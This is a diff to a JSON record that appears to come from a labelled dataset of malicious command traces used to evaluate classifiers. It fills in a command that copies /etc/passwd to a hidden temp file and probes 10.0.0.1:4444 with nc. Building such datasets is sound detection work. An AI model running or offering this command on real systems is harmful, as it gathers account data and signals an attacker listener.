@@ -2,7 +2,7 @@
   "trace": "attack_T1003_T1071.log",
   "ground_truth": "MALICIOUS",
   "technique": "T1003,T1071",
-  "command": ,
+  "command": "bash -c 'cat /etc/passwd > /tmp/.x; nc -w1 -z 10.0.0.1 4444 || true'",
   "label_source": "researcher_at_capture_time",
   "capture_mode": "docker_ubuntu_22.04",
   "label_rationale": "Label assigned from command intent before LLM classification"
